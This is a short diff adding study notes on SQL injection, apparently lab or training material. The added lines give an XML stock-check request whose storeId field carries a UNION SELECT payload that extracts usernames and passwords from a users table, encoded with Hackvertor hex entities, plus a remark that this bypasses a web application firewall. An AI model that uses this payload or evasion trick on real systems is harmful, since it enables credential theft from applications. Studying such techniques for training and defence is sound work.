@@ -37,3 +37,8 @@ Using the following SQL Statement, we can gather the results from the two tables
 |Widgets Ltd|Unit 1a, Newby Estate|Bristol|BS19 4RT|
 |The Tool Company|75 Industrial Road|Norwich|N22 3DR|
 |Axe Makers Ltd|2b Makers Unit, Market Road|London|SE9 1KK|
+SQLi in a XML request
+
+`<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>1 UNION SELECT username || ' ' ||password from users--</@hex_entities></storeId></stockCheck>`
+
+using hackvertor we added the hex_entities to bypass the waff
